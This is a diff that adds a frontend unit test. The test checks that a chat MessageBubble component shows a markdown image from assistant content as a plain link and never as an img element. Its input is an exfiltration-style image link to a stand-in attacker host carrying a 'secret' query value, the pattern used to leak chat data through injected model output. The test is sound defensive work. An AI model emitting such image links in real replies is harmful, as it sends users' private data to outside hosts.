@@ -17,4 +17,13 @@ describe('MessageBubble', () => {
     expect(screen.getByText('bold').tagName).toBe('STRONG')
     expect(screen.getByRole('table')).toBeInTheDocument()
   })
+
+  it('never renders model-provided images', () => {
+    const { container } = render(
+      <MessageBubble role="assistant" content={'![x](https://evil.example/p.png?d=secret)'} />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    const link = screen.getByRole('link', { name: 'x' })
+    expect(link).toHaveAttribute('href', 'https://evil.example/p.png?d=secret')
+  })
 })
